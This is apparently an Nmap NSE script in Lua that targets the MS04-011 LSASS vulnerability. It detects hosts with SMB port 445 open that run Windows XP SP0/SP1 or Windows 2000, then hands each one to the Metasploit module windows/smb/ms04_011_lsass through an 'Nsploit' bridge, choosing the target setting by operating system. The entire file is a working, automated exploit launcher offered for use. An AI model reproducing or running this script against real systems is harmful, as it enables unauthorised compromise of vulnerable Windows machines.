id="ms04_011_lsass"

description="Attempts to exploit the ms04-011 LSASS vulnerability"

author = "Sussurro <sussurro@happypacket.net>"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"exploit"}

require "Nsploit"
require "stdnse"

portrule = function(host,port)
	local smb_port = { number=445, protocol="tcp" }
        local smb = nmap.get_port_state(host,smb_port)

	if 
		smb ~= nil
		and smb.state == "open"
		and port.service == "microsoft-ds"
		and ( Nsploit.hostMatch(host.os,"Windows XP SP[01]")
		or Nsploit.hostMatch(host.os,"Windows 2000"))
	then
		return true
	else
		return false
	end
end

action = function(host, port)
	local try = nmap.new_try()
	sock = Nsploit.msfInit()
	opts = { TARGET = 1 }	
	if Nsploit.hostMatch(host.os,"Windows 2000") then
		opts["TARGET"] = 2
	end
		
	return Nsploit.exploit(sock,"windows/smb/ms04_011_lsass","Windows",host.ip,opts)

end
